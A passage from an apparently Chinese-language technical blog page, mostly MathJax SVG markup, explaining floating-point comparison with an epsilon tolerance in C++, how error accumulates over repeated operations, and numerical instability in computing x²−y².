578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(2683.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3683.9,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(4089.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(4478.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(4923.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5717.8,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(6218,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(6607,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(7329.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(8329.4,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(8735.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(9124.4,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></span></p>
<p><strong>浮点数比较</strong></p>
<p>由于浮点数存在精度误差，<strong>直接比较 <code>a == b</code>
可能不可靠</strong>，所以通常采用 <strong>“误差范围判断”</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">float</span> eps = std::numeric_limits&lt;<span class="type">float</span>&gt;::<span class="built_in">epsilon</span>(); <span class="comment">// 约 2^(-23)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">eq</span><span class="params">(<span class="type">float</span> a, <span class="type">float</span> b)</span> </span>{</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">abs</span>(a - b) &lt;= eps;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<ul>
<li>如果 <code>a</code> 和 <code>b</code> 相差小于机器精度
<code>eps</code>，就认为它们相等。</li>
<li>但这种方法
<strong>只适用于单次运算误差</strong>，多个计算累积误差后可能需要更大的
<code>eps</code> 进行容忍。</li>
</ul>
<h5 id="浮点误差的累积">浮点误差的累积</h5>
<p>如果进行 <strong>n 次</strong> 乘法运算，每次的误差上界约为 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="6.576ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2906.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1111.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2111.4,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(2517.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>，那么累积误差大致为：
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="25.072ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 11081.7 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(1111.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(2111.4,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="msup" transform="translate(2517.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,413) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3691.5,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(4747.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(5469.5,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(6469.7,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7069.7,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(7697.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(8698.2,0)"><path data-c="1D442" d="M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z"></path></g><g data-mml-node="mo" transform="translate(9461.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(9850.2,0)"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mn" transform="translate(439,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(10692.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
这意味着<strong>误差会随着运算次数线性增长</strong>。在大多数情况下，如果
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.058ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 3561.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(877.8,0)"><path data-c="226A" d="M639 -48Q639 -54 634 -60T619 -67H618Q612 -67 536 -26Q430 33 329 88Q61 235 59 239Q56 243 56 250T59 261Q62 266 336 415T615 567L619 568Q622 567 625 567Q639 562 639 548Q639 540 633 534Q632 532 374 391L117 250L374 109Q632 -32 633 -34Q639 -40 639 -48ZM944 -48Q944 -54 939 -60T924 -67H923Q917 -67 841 -26Q735 33 634 88Q366 235 364 239Q361 243 361 250T364 261Q367 266 641 415T920 567L924 568Q927 567 930 567Q944 562 944 548Q944 540 938 534Q937 532 679 391L422 250L679 109Q937 -32 938 -34Q944 -40 944 -48Z"></path></g><g data-mml-node="mn" transform="translate(2155.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2655.6,0)"><g data-mml-node="mo"><path data-c="2F" d="M423 750Q432 750 438 744T444 730Q444 725 271 248T92 -240Q85 -250 75 -250Q68 -250 62 -245T56 -231Q56 -221 230 257T407 740Q411 750 423 750Z"></path></g></g><g data-mml-node="mi" transform="translate(3155.6,0)"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container></span>，误差增长仍然是可接受的。</p>
<h5 id="数值不稳定性与避免方法">数值不稳定性与避免方法</h5>
<p>某些计算方式会<strong>放大浮点误差</strong>，导致数值不稳定。例如：</p>
<h5 id="不稳定计算"><strong>不稳定计算</strong></h5>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.574ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 7325.8 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1955.7,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2445.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3112.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(4168.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(5399,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(6399.2,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container></span></p>
<p>计算误差分析： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="56.617ex" height="2.565ex" role="img" focusable="false" viewBox="0 -883.9 25024.7 1133.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,413) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(880.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1269.5,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 